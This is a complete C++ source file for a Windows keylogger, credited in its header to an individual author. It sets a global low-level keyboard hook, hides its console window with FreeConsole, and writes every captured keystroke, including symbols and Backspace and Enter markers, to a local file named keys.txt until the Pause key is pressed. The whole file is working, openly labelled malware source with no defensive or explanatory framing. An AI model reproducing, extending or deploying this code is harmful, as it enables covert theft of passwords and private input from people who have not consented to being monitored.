/*
	Code by Luke Honeyball
	5/10/2024
	Keylogger

*/

#include <iostream>
#include <windows.h>
#include <fstream>
//imports
HHOOK hook;
bool running = true;
std::string path = "keys.txt";
std::ofstream File(path);
bool _shiftdown = false;




void keyCompareDown_(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
		if (pKeyStruct->vkCode == VK_SHIFT || pKeyStruct->vkCode == VK_RSHIFT || pKeyStruct->vkCode == VK_LSHIFT) { _shiftdown = true; }
		char specials_[10] = { ')','!','@','#','$','%','^','&','*','(' };
		for (int specialsc_ = 0; specialsc_ < 10; specialsc_++) {
			if (_shiftdown && pKeyStruct->vkCode == 48 + specialsc_) {
				File << specials_[specialsc_];
			}
		}

		if (pKeyStruct->vkCode == VK_OEM_1) {
			if (_shiftdown) {
				File << ':';
			}
			else {
				File << ';';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_2) {
			if (_shiftdown) {
				File << '?';
			}
			else {
				File << '/';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_3) {
			if (_shiftdown) {
				File << '~';
			}
			else {
				File << '`';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_4) {
			if (_shiftdown) {
				File << '{';
			}
			else {
				File << '[';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_5) {
			if (_shiftdown) {
				File << '|';
			}
			else {
				File << '\\';
			}
		}

		else if (pKeyStruct->vkCode == VK_OEM_6) {
			if (_shiftdown) {
				File << '}';
			}
			else {
				File << ']';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_7) {
			if (_shiftdown) {
				File << '\"';
			}
			else {
				File << '\'';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_COMMA) {
			if (_shiftdown) {
				File << '<';
			}
			else {
				File << ',';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_PERIOD) {
			if (_shiftdown) {
				File << '>';
			}
			else {
				File << '.';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_MINUS) {
			if (_shiftdown) {
				File << '_';
			}
			else {
				File << '-';
			}
		}
		else if (pKeyStruct->vkCode == VK_OEM_PLUS) {
			if (_shiftdown) {
				File << '+';
			}
			else {
				File << '=';
			}
		}



		else if (pKeyStruct->vkCode == VK_BACK)
		{
			File << " |BACKSPACE| ";
			Sleep(100);
		}
		else if (pKeyStruct->vkCode == VK_PAUSE) {

			File.close();

			UnhookWindowsHookEx(hook);
			exit(0);
		}
		else if (pKeyStruct->vkCode == VK_RETURN) {
			File << " |ENTER| ";
		}
		else if (_shiftdown == false) {
			for (int x = 7; x < 128; x++) {

				if (pKeyStruct->vkCode == x) {
					File << (char)pKeyStruct->vkCode;
					Sleep(100);
				}

			}
		}
	}
}
//all key comparing



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)) {
		KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
		if (pKeyStruct->vkCode == VK_SHIFT || pKeyStruct->vkCode == VK_RSHIFT || pKeyStruct->vkCode == VK_LSHIFT) { _shiftdown = false; }
	}
	keyCompareDown_(nCode,wParam,lParam);
	return CallNextHookEx(hook, nCode, wParam, lParam);
}
//hook process

int main() {
	FreeConsole();
	hook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
	MSG m;
	while (running == true) {

		GetMessage(&m,NULL,0,0);
		TranslateMessage(&m);
		DispatchMessage(&m); 
		//loop
	}
	
	return 0;
}


//revised 2
